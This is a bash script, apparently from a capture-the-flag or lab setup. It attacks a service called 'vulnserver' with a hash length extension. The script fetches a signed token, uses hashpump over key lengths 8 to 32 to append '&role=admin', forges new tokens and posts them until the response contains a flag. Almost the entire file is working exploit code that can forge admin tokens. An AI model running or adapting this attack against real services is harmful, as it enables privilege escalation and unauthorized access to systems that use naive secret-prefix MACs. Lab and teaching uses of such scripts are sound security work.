#!/usr/bin/env bash
set -e

# Wait for server
echo "Waiting for vulnserver..."
until curl -s http://vulnserver:5000/get_token > /dev/null; do
  sleep 1
done
echo "vulnserver is up."

# Get legitimate token
TOKEN=$(curl -s http://vulnserver:5000/get_token | jq -r .token)
DATA=$(curl -s http://vulnserver:5000/get_token | jq -r .data)
echo "Original data: $DATA"
echo "Original token: $TOKEN"

# Try several key length guesses
# The server uses key length 21 (TEST_SECRET_KEY_12345)
# We iterate to simulate real attack
for k in {8..32}; do
    echo "Trying keylen=$k"

    # decode, split data and mac
    RAW=$(echo -n "$TOKEN" | base64 -d)
    # Assuming standard format data.mac
    DATA_PART=$(echo -n "$RAW" | awk -F'.' '{print $1}')
    MAC_PART=$(echo -n "$RAW" | awk -F'.' '{print $2}')

    # run hashpump
    # We output to a temp file because hashpump writes multiple lines
    if ! hashpump -s "$MAC_PART" -d "$DATA_PART" -a "&role=admin" -k "$k" > /tmp/hp.out; then
        # hashpump might fail for some reason, continue
        continue
    fi

    NEWHASH=$(sed -n '1p' /tmp/hp.out)
    NEWDATA=$(sed -n '2p' /tmp/hp.out)

    # Reconstruct token
    NEWTOKEN=$(printf "%s.%s" "$NEWDATA" "$NEWHASH" | base64 -w0)

    echo "Trying forged token with keylen=$k..."
    
    # Send request
    RESP=$(curl -s -X POST http://vulnserver:5000/resource \
        -H "Content-Type: application/json" \
        -d "{\"token\":\"$NEWTOKEN\"}")
    
    echo "Response: $RESP"

    # Check for success
    if echo "$RESP" | grep -q "FLAG"; then
        echo "SUCCESS with keylen=$k"
        echo "Forged token: $NEWTOKEN"
        break
    fi
done

echo "Attack finished."
# Keep container running for inspection
/bin/bash
